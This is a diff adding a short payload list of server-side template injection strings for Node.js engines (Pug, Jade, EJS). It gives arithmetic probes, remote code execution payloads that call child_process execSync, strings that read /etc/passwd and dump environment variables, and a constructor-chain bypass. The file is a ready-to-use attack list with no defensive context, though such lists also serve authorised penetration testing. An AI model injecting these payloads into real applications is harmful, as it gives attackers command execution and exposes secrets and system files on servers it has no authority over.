@@ -1,0 +1,22 @@
+# Node.js SSTI Payloads (Pug, EJS, Jade)
+
+# Identification
+#{7*7}
+<%= 7*7 %>
+${7*7}
+
+# RCE (Pug / Jade)
+#{process.mainModule.require('child_process').execSync('id').toString()}
+#{require('child_process').execSync('id').toString()}
+
+# RCE (EJS / JS Templates)
+<%= process.mainModule.require('child_process').execSync('id').toString() %>
+<%= Function('return process.mainModule.require("child_process").execSync("id").toString()')() %>
+
+# Data Exfiltration
+#{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
+#{process.env}
+#{process.cwd()}
+
+# Advanced Bypasses
+#{constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}
